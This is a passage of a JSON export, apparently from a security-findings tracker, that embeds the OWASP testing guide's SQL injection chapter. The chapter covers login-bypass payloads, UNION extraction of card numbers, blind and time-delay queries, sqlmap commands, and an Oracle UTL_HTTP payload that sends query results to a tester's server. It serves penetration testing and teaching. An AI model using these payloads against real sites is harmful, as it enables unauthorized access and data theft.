Kirda](http://s3.eurecom.fr/docs/ndss11_hpp.pdf)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05 Testing for SQL Injection","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nSQL injection testing checks if it is possible to inject data into an application/site so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. Successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database, which if you didn\u2019t know already is quite bad.\nAn [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) attack consists of insertion or \u201Cinjection\u201D of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input to affect the execution of predefined SQL commands.\nIn general, the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:\n\u0060select title, text from news where id=$id\u0060\nIn the example above the variable \u0060$id\u0060 contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.\nBecause of the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user\u2019s choice. The example below illustrates the user-supplied data \u201C10 or 1=1\u201D, changing the logic of the SQL statement, modifying the WHERE clause adding a condition \u201Cor 1=1\u201D.\n\u0060select title, text from news where id=10 or 1=1\u0060\n\n\u003E ***NOTE:*** Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you\u2019re injecting into, it\u2019s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\nSQL Injection attacks can be divided into the following three classes:\n\n* Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward attack, in which the retrieved data is presented directly in the application web page.\n* Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).\n* Inferential or Blind: there is no actual transfer of data. Still, the tester can reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.\n\nA successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.\nAbout the techniques to exploit SQL injection flaws, there are five common techniques. Also, those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):\n\n* Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.\n* Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.\n* Error-based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.\n* Out-of-band: the technique used to retrieve data using a different channel (e.g., make an HTTP connection to send the results to a web server).\n* Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when the attacker doesn\u2019t have some answer (result, output, or error) from the application.","TestingInstructions":"## Test Objectives\n\n* Identify SQL injection points.\n* Assess the severity of the injection and the level of access that can be achieved through it.\n\n## How to Test\n\n### Detection Techniques\n\nThe first step in this test is to understand when the application interacts with a DB Server to access some data. Typical examples of cases, when an application needs to talk to a DB, include:\n\n* Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).\n* Search engines: the string submitted by the user could be used in an SQL query that extracts all relevant records from a database.\n* E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.\n\nThe tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests, and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.\nThe very first test usually consists of adding a single quote \u0060\u0027\u0060 or a semicolon \u0060;\u0060 to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a Microsoft SQL Server, in this case):\n\n\u0060\u0060\u0060\nMicrosoft OLE DB Provider for ODBC Drivers error \u002780040e14\u0027\n[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the\ncharacter string \u0027\u0027.\n/target/target.asp, line 113\n\u0060\u0060\u0060\n\nAlso comment delimiters (\u0060--\u0060 or \u0060/* */\u0060, etc) and other SQL keywords like \u0060AND\u0060 and \u0060OR\u0060 can be used to try to modify the query. A very simple but sometimes still effective technique is simply to insert a string where a number is expected, as an error like the following might be generated:\n\n\u0060\u0060\u0060\nMicrosoft OLE DB Provider for ODBC Drivers error \u002780040e07\u0027\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the\nvarchar value \u0027test\u0027 to a column of data type int.\n/target/target.asp, line 113\n\u0060\u0060\u0060\n\nMonitor all the responses from the web server and have a look at the HTML/JavaScript source code. Sometimes the error is present inside them but for some reason (e.g. JavaScript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester to mount a successful injection attack. However, applications often do not provide so much detail: a simple \u2018500 Server Error\u2019 or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the others remain constant, in order to precisely understand which parameters are vulnerable and which are not.\n\n### Standard SQL Injection Testing Methods\n\n#### Classic SQL Injection\n\nConsider the following SQL query:\n\u0060SELECT * FROM Users WHERE Username=\u0027$username\u0027 AND Password=\u0027$password\u0027\u0060\nA similar query is generally used from the web application to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to log-in to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:\n\u0060$username = 1\u0027 or \u00271\u0027 = \u00271\u0060\n\u0060$password = 1\u0027 or \u00271\u0027 = \u00271\u0060\nThe query will be:\n\u0060SELECT * FROM Users WHERE Username=\u00271\u0027 OR \u00271\u0027 = \u00271\u0027 AND Password=\u00271\u0027 OR \u00271\u0027 = \u00271\u0027\u0060\n\n\u003E ***NOTE:*** Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you\u2019re injecting into, it\u2019s common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\nIf we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable site is \u0060www.example.com\u0060, the request that we\u2019ll carry out will be:\n\u0060http://www.example.com/index.php?username=1\u0027%20or%20\u00271\u0027%20=%20\u00271\u0026amp;password=1\u0027%20or%20\u00271\u0027%20=%20\u00271\u0060\nAfter a short analysis, we notice that the query returns a value (or a set of values) because the condition is always true (\u0060OR 1=1\u0060). In this way, the system has authenticated the user without knowing the username and password.\n\n\u003E Note: In some systems, the first row of a user table would be an administrator user. This may be the profile returned in some cases.\n\nAnother example query is the following:\n\u0060SELECT * FROM Users WHERE ((Username=\u0027$username\u0027) AND (Password=MD5(\u0027$password\u0027)))\u0060\nIn this case, there are two problems, one due to the use of the parentheses and one due to the use of the MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding some closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such a symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol for the greater majority of databases is \u0060/*\u0060. In Oracle, the symbol is \u0060--\u0060. This said the values that we\u2019ll use as Username and Password are:\n\u0060$username = 1\u0027 or \u00271\u0027 = \u00271\u0027))/*\u0060\n\u0060$password = foo\u0060\nIn this way, we\u2019ll get the following query:\n\u0060SELECT * FROM Users WHERE ((Username=\u00271\u0027 or \u00271\u0027 = \u00271\u0027))/*\u0027) AND (Password=MD5(\u0027$password\u0027)))\u0060\n(Due to the inclusion of a comment delimiter in the \u0060$username\u0060 value the password portion of the query will be ignored.)\nThe request URL will be:\n\u0060http://www.example.com/index.php?username=1\u0027%20or%20\u00271\u0027%20=%20\u00271\u0027))/*\u0026amp;password=foo\u0060\nThis may return some values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). To get around this problem, it is enough to insert an SQL command that imposes a condition that the number of the returned results must be one (one record returned). To reach this goal, we use the operator \u0060LIMIT \u003Cnum\u003E\u0060, where \u0060\u003Cnum\u003E\u0060 is the number of the results/records that we want to be returned. Concerning the previous example, the value of the fields Username and Password will be modified as follows:\n\u0060$username = 1\u0027 or \u00271\u0027 = \u00271\u0027)) LIMIT 1/*\u0060\n\u0060$password = foo\u0060\nIn this way, we create a request like the following:\n\u0060http://www.example.com/index.php?username=1\u0027%20or%20\u00271\u0027%20=%20\u00271\u0027))%20LIMIT%201/*\u0026amp;password=foo\u0060\n\n#### SELECT Statement\n\nConsider the following SQL query:\n\u0060SELECT * FROM products WHERE id_product=$id_product\u0060\nConsider also the request to a script that executes the query above:\n\u0060http://www.example.com/product.php?id=10\u0060\nWhen the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is to play with logic, using the operators AND and OR.\nConsider the request:\n\u0060http://www.example.com/product.php?id=10 AND 1=2\u0060\n\u0060SELECT * FROM products WHERE id_product=10 AND 1=2\u0060\nIn this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:\n\u0060http://www.example.com/product.php?id=10 AND 1=1\u0060\n\n#### Stacked Queries\n\nDepending on the API that the web application is using and the DBMS (e.g. PHP \u002B PostgreSQL, ASP\u002BSQL SERVER) it may be possible to execute multiple queries in one call.\nConsider the following SQL query:\n\u0060SELECT * FROM products WHERE id_product=$id_product\u0060\nA way to exploit the above scenario would be:\n\u0060http://www.example.com/product.php?id=10; INSERT INTO users (\u2026)\u0060\nThis way is possible to execute many queries in a row and independent of the first query.\n\n### Fingerprinting the Database\n\nEven though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, and functions to retrieve data such as users\u2019 names and databases, features, comments lines, etc.\nWhen the testers move to a more advanced SQL injection exploitation they need to know what the backend database is.\n\n#### Errors Returned by the Application\n\nThe first way to find out what backend database is used is by observing the error returned by the application. The following are some examples of error messages:\nMySql:\n\n\u0060\u0060\u0060\nYou have an error in your SQL syntax; check the manual\nthat corresponds to your MySQL server version for the\nright syntax to use near \u0027\\\u0027\u0027 at line 1\n\u0060\u0060\u0060\n\nOne complete UNION SELECT with version() can also help to know the backend database.\n\u0060SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1\u0060\nOracle:\n\u0060ORA-00933: SQL command not properly ended\u0060\nMS SQL Server:\n\n\u0060\u0060\u0060\nMicrosoft SQL Native Client error \u201880040e14\u2019\nUnclosed quotation mark after the character string\n\nSELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1\n\u0060\u0060\u0060\n\nPostgreSQL:\n\n\u0060\u0060\u0060\nQuery failed: ERROR: syntax error at or near\n\u0022\u2019\u0022 at character 56 in /www/site/test.php on line 121.\n\u0060\u0060\u0060\n\nIf there is no error message or a custom error message, the tester can try to inject it into string fields using varying concatenation techniques:\n\n* MySql: \u2018test\u2019 \u002B \u2018ing\u2019\n* SQL Server: \u2018test\u2019 \u2018ing\u2019\n* Oracle: \u2018test\u2019\u00A0\u2019ing\u2019\n* PostgreSQL: \u2018test\u2019\u00A0\u2019ing\u2019\n\n### Exploitation Techniques\n\n#### Union Exploitation Technique\n\nThe UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose, for our example, that the query executed from the server is the following:\n\u0060SELECT Name, Phone, Address FROM Users WHERE Id=$id\u0060\nWe will set the following \u0060$id\u0060 value:\n\u0060$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable\u0060\nWe will have the following query:\n\u0060SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable\u0060\nWhich will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword \u0060ALL\u0060 is necessary to get around queries that use the keyword \u0060DISTINCT\u0060. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns to avoid a syntax error.\nThe first detail a tester needs to find to exploit the SQL injection vulnerability using this technique is the right number of columns in the SELECT statement.\nTo achieve this, the tester can use the \u0060ORDER BY\u0060 clause followed by a number indicating the numeration of the database\u2019s column selected:\n\u0060http://www.example.com/product.php?id=10 ORDER BY 10--\u0060\nIf the query executes with success, the tester can assume in this example that there are 10 or more columns in the \u0060SELECT\u0060 statement. If the query fails, then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:\n\u0060Unknown column \u002710\u0027 in \u0027order clause\u0027\u0060\nAfter the tester finds out the number of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:\n\u0060http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--\u0060\nIf the query fails, the tester will probably see a message like:\n\u0060All cells in a column must have the same datatype\u0060\nIf the query executes with success, the first column can be an integer. Then the tester can move further and so on:\n\u0060http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--\u0060\nAfter the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a \u0060LIMIT\u0060 clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database that has an ID that equals 99999):\n\u0060http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--\u0060\n\n#### Hidden Union Exploitation Technique\n\nIt\u2019s best when you can exploit a SQL injection with the [union technique](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique) because you can retrieve the result of your query in one request.\nBut most of the SQL injections in the wild are blind. Yet, you can turn some of them into union-based injections.\n**Identification**\nEither of the following methods can be used to identify these SQL injections:\n\n1. The vulnerable query returns data, but the injection is blind.\n2. The \u0060ORDER BY\u0060 technique works, but you can\u2019t achieve a union-based injection.\n\n**Root Cause**\nThe reason you can\u2019t use the usual Union techniques is the complexity of the vulnerable query. In the Union Technique, you comment on the rest of the query after your \u0060UNION\u0060 payload. It\u2019s fine for normal queries, but in more complicated queries it can be problematic. If the first part of the query depends on the second part of it, commenting on the rest of it breaks the original query.\n**Scenario 1**\nThe vulnerable query is a sub-query, and the parent query handles returning the data.\n\n\u0060\u0060\u0060\nSELECT \n  * \nFROM \n  customers \nWHERE \n  id IN (                 --\\\n    SELECT                   |\n      DISTINCT customer_id   |\n    FROM                     |\n      orders                 |--\u003E vulnerable query\n    WHERE                    |\n      cost \u003E 200             |\n  );                      --/\n\u0060\u0060\u0060\n\n* *Problem:* If you inject a \u0060UNION\u0060 payload, it doesn\u2019t affect the returned data. Because you are modifying the \u0060WHERE\u0060 section. In fact, you are not appending a \u0060UNION\u0060 query to the original query.\n* *Solution:* You need to know the query which gets executed in the backend. Then, create your payload based on that. It means closing open parentheses or adding proper keywords if needed.\n\n**Scenario 2**\nThe vulnerable query contains aliases or variable declarations.\n\n\u0060\u0060\u0060\nSELECT \n  s1.user_id, \n  (                                                                                      --\\\n    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = \u0027INJECTION_HERE\u0027 THEN 1 ELSE 0 END   |--\u003E vulnerable query\n  ) AS overlap                                                                           --/\nFROM \n  subscriptions AS s1 \n  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id \n  AND s1.start_date \u003C= s2.end_date \n  AND s1.end_date \u003E= s2.start_date \nGROUP BY \n  s1.user_id\n\u0060\u0060\u0060\n\n* *Problem:* You break the query when you comment the rest of the original query after your injected payload because some aliases or variables become \u0060undefined\u0060.\n* *Solution:* You need to put appropriate keywords or aliases at the beginning of your payload. this way the first part of the original query stays valid.\n\n**Scenario 3**\nThe result of the vulnerable query is being used in a second query. The second query returns the data, not the first one.\n\n\u0060\u0060\u0060\n\u003C?php\n// retrieves product ID based on product name\n                            --\\\n$query1 = \u0022SELECT              |\n             id                |\n           FROM                |\n             products          |--\u003E vulnerable query #1\n           WHERE               |\n             name = \u0027$name\u0027\u0022;  |\n                            --/\n$result1 = odbc_exec($conn, $query1);\n// retrieves product\u0027s comments based on the product ID\n                              --\\\n$query2 = \u0022SELECT                |\n             comments            |\n           FROM                  |\n             products            |--\u003E vulnerable query #2\n           WHERE                 |\n             id = \u0027$result1\u0027\u0022;   |\n                              --/\n$result1 = odbc_exec($conn, $query2);\n?\u003E\n\u0060\u0060\u0060\n\n* *Problem:* You can add a \u0060UNION\u0060 payload to the first query but it won\u2019t affect the returned data.\n* *solution:* You need to inject in the second query. So the input to the second query should not get sanitized. Then, you need to make the first query return no data. Now append a \u0060UNION\u0060 query that returns the payload you want to inject in the *second query*.\n    **Example:**\n    The base of the payload (what you inject in the first query):\n\n    \u0060\u0060\u0060\n    \u0027 AND 1 = 2 UNION SELECT \u0022PAYLOAD\u0022 -- -\n    \n    \u0060\u0060\u0060\n\n    The \u0060PAYLOAD\u0060 is what you want to inject in the *second query*:\n\n    \u0060\u0060\u0060\n    \u0027 AND 1=2 UNION SELECT ...\n    \n    \u0060\u0060\u0060\n\n    The final payload (after replacing the \u0060PAYLOAD\u0060):\n\n    \u0060\u0060\u0060\n    \u0027 AND 1 = 2 UNION SELECT \u0022\u0027 AND 1=2 UNION SELECT ...\u0022 -- -\n                              \\________________________/\n                                          ||\n                                          \\/\n                                   the payload that\n                                    get\u0027s injected\n                                 into the second query\n    \\________________________________________________________/\n                                ||\n                                \\/\n     the actual query we inject into the vulnerable parameter\n    \n    \u0060\u0060\u0060\n\n    The first query after injection:\n\n    \u0060\u0060\u0060\n    SELECT               --\\\n      id                    |\n    FROM                    |----\u003E first query\n      products              |\n    WHERE                   |\n      name = \u0027abcd\u0027      --/\n      AND 1 = 2                                 --\\\n    UNION                                          |----\u003E injected payload (what gets injected into the second payload)\n    SELECT                                         |\n      \u0022\u0027 AND 1=2 UNION SELECT ... -- -\u0022 -- -\u0027   --/\n    \n    \u0060\u0060\u0060\n\n    The second query after injection:\n\n    \u0060\u0060\u0060\n    SELECT            --\\\n      comments           |\n    FROM                 |----\u003E second query\n      products           |\n    WHERE                |\n      id = \u0027\u0027         --/\n      AND 1 = 2         --\\ \n    UNION                  |----\u003E injected payload (the final UNION query that controls the returned data)\n    SELECT ... -- -\u0027    --/\n    \n    \u0060\u0060\u0060\n\n**Scenario 4**\nThe vulnerable parameter is being used in several independent queries.\n\n\u0060\u0060\u0060\n\u003C?php\n//retrieving product details based on product ID\n$query1 = \u0022SELECT \n             name, \n             inserted, \n             size \n           FROM \n             products \n           WHERE \n             id = \u0027$id\u0027\u0022;\n$result1 = odbc_exec($conn, $query1);\n//retrieving product comments based on the product ID\n$query2 = \u0022SELECT \n             comments \n           FROM \n             products \n           WHERE \n             id = \u0027$id\u0027\u0022;\n$result2 = odbc_exec($conn, $query2);\n?\u003E\n\u0060\u0060\u0060\n\n* *Problem:* Appending a \u0060UNION\u0060 query to the first (or second) query doesn\u2019t break it, but it may break the other one.\n* *Solution:* It depends on the code structure of the application. But the first step is to know the original query. Most of the time, these injections are time-based. Also, the time-based payload gets injected in several queries which can be problematic.\n    \n    For example, if you use \u0060SQLMap\u0060, this situation confuses the tool and the output gets messed up. Because the delays will not be as expected.\n\n**Extracting Original Query**\nAs you see, knowing the original query is always needed to achieve a union-based injection.\nYou can retrieve the original query using the default DBMS tables:\n\n| DBMS | Table |\n| ---- | ----- |\n| MySQL | INFORMATION\\_SCHEMA.PROCESSLIST |\n| PostgreSQL | pg\\_stat\\_activity |\n| Microsoft SQL Server | sys.dm\\_exec\\_cached\\_plans |\n| Oracle | V$SQL |\n\n**Automation**\nSteps to automate the workflow:\n\n1. Extract the original query using \u0060SQLMap\u0060 and blind injection.\n2. Build a base payload according to the original query and achieve union-based injection.\n3. Automate the exploitation of the union-based injection by one of these options:\n    * Specifying a *custom injection point marker* (\u0060*\u0060)\n    * Using \u0060--prefix\u0060 and \u0060--suffix\u0060 flags.\n\n**Example:**\nConsider the third scenario discussed above.\nWe assume the DMBS is \u0060MySQL\u0060 and the first and second queries return only one column. This can be your payload for extracting the version of the database:\n\n\u0060\u0060\u0060\n\u0027 AND 1=2 UNION SELECT \u0022 \u0027 AND 1=2 UNION SELECT @@version -- -\u0022 -- -\n\u0060\u0060\u0060\n\nSo the target URL would be like this:\n\n\u0060\u0060\u0060\nhttp://example.org/search?query=abcd\u0027\u002BAND\u002B1=2\u002BUNION\u002BSELECT\u002B\u0022\u002B\u0027AND 1=2\u002BUNION\u002BSELECT\u002B@@version\u002B--\u002B-\u0022\u002B--\u002B-\n\u0060\u0060\u0060\n\nAutomation:\n\n* *custom injection point marker* (\u0060*\u0060):\n\n    \u0060\u0060\u0060\n    sqlmap -u \u0022http://example.org/search?query=abcd\u0027AND 1=2 UNION SELECT \\\u0022*\\\u0022-- -\u0022\n    \n    \u0060\u0060\u0060\n* \u0060--prefix\u0060 and \u0060--suffix\u0060 flags:\n\n    \u0060\u0060\u0060\n    sqlmap -u \u0022http://example.org/search?query=abcd\u0022 --prefix=\u0022\u0027AND 1=2 UNION SELECT \\\u0022\u0022 --suffix=\u0022\\\u0022-- -\u0022\n    \n    \u0060\u0060\u0060\n\n#### Boolean Exploitation Technique\n\nThe Boolean exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything about the structure of the query or the database. (The page does not return a SQL error, it may just return an HTTP 500, 404, or redirect).\nBy using inference methods, it is possible to avoid this obstacle and thus succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers, and finally deducing the meaning of such answers. We consider, as always, the \u0060www.example.com\u0060 domain and we suppose that it contains a parameter named \u0060id\u0060 vulnerable to SQL injection. This means that when carrying out the following request:\n\u0060http://www.example.com/index.php?id=1\u0027\u0060\nWe will get one page with a custom error message which is due to a syntactic error in the query. We suppose that the query executed on the server is:\n\u0060SELECT field1, field2, field3 FROM Users WHERE Id=\u0027$Id\u0027\u0060\nWhich is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our example, we will use the following pseudo-functions:\n\n* SUBSTRING (text, start, length): returns a substring starting from the position \u201Cstart\u201D of text and length \u201Clength\u201D. If \u201Cstart\u201D is greater than the length of text, the function returns a null value.\n* ASCII (char): it gives back the ASCII value of the input character. A null value is returned if char is 0.\n* LENGTH (text): it gives back the number of characters in the input text.\n\nThrough such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass it to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, to select only one character at a time (selecting a single character means imposing the length parameter to 1), and the function ASCII, to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table until the right value is found. As an example, we will use the following value for \u0060Id\u0060:\n\u0060$Id=1\u0027 OR ASCII(SUBSTRING(username,1,1))=97 AND \u00271\u0027=\u00271\u0060\nThat creates the following query (from now on, we will call it \u201Cinferential query\u201D):\n\u0060SELECT field1, field2, field3 FROM Users WHERE Id=\u00271\u0027 OR ASCII(SUBSTRING(username,1,1))=97 AND \u00271\u0027=\u00271\u0027\u0060\nThe previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set the index of the ASCII table to zero and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for \u0060Id\u0060:\n\u0060$Id=1\u0027 AND \u00271\u0027 = \u00272\u0060\nWhich will create the following query:\n\u0060SELECT field1, field2, field3 FROM Users WHERE Id=\u00271\u0027 AND \u00271\u0027 = \u00272\u0027\u0060\nThe obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates to decide the result of the test.\nIn the previous discussion, we haven\u2019t dealt with the problem of determining the termination condition for our tests, i.e. when we should end the inference procedure. A technique to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e. the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.\nWe will insert the following value for the field \u0060Id\u0060:\n\u0060$Id=1\u0027 OR LENGTH(username)=N AND \u00271\u0027 = \u00271\u0060\nWhere N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:\n\u0060SELECT field1, field2, field3 FROM Users WHERE Id=\u00271\u0027 OR LENGTH(username)=N AND \u00271\u0027 = \u00271\u0027\u0060\nThe query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.\nThe blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.\n\n#### Error Based Exploitation Technique\n\nAn Error based exploitation technique is useful when the tester for some reason can\u2019t exploit the SQL injection vulnerability using other techniques such as UNION. The Error-based technique consists of forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).\nConsider the following SQL query:\n\u0060SELECT * FROM products WHERE id_product=$id_product\u0060\nConsider also the request to a script that executes the query above:\n\u0060http://www.example.com/product.php?id=10\u0060\nThe malicious request would be (e.g. Oracle 10g):\n\u0060http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--\u0060\nIn this example, the tester is concatenating the value 10 with the result of the function \u0060UTL_INADDR.GET_HOST_NAME\u0060. This Oracle function will try to return the hostname of the parameter passed to it, which is another query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:\n\u0060ORA-292257: host SCOTT unknown\u0060\nThen the tester can manipulate the parameter passed to the GET\\_HOST\\_NAME() function and the result will be shown in the error message.\n\n#### Out-of-Band Exploitation Technique\n\nThis technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. The technique consists of the use of DBMS functions to perform an out-of-band connection and deliver the results of the injected query as part of the request to the tester\u2019s server. Like the error-based techniques, each DBMS has its functions. Check for specific DBMS sections.\nConsider the following SQL query:\n\u0060SELECT * FROM products WHERE id_product=$id_product\u0060\nConsider also the request to a script that executes the query above:\n\u0060http://www.example.com/product.php?id=10\u0060\nThe malicious request would be:\n\u0060http://www.example.com/product.php?id=10||UTL_HTTP.request(\u2018testerserver.com:80\u2019||(SELECT user FROM DUAL)--\u0060\nIn this example, the tester is concatenating the value 10 with the result of the function \u0060UTL_HTTP.request\u0060. This Oracle function will try to connect to \u0060testerserver\u0060 and make an HTTP GET request containing the return from the query \u0060SELECT user FROM DUAL\u0060. The tester can set up a web server (e.g. Apache) or use the Netcat tool:\n\n\u0060\u0060\u0060\n/home/tester/nc \u2013nLp 80\n\nGET /SCOTT HTTP/1.1\nHost: testerserver.com\nConnection: close\n\u0060\u0060\u0060\n\n#### Time Delay Exploitation Technique\n\nThe time delay exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. This technique consists of sending an injected query and in case the conditional is true, the tester can monitor the time taken for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).\nConsider the following SQL query:\n\u0060SELECT * FROM products WHERE id_product=$id_product\u0060\nConsider also the request to a script that executes the query above:\n\u0060http://www.example.com/product.php?id=10\u0060\nThe malicious request would be (e.g. MySql 5.x):\n\u0060http://www.example.com/product.php?id=10 AND IF(version() like \u20185%\u2019, sleep(10), \u2018false\u2019))--\u0060\nIn this example the tester is checking whether the MySql version is 5.x or not, making the server to 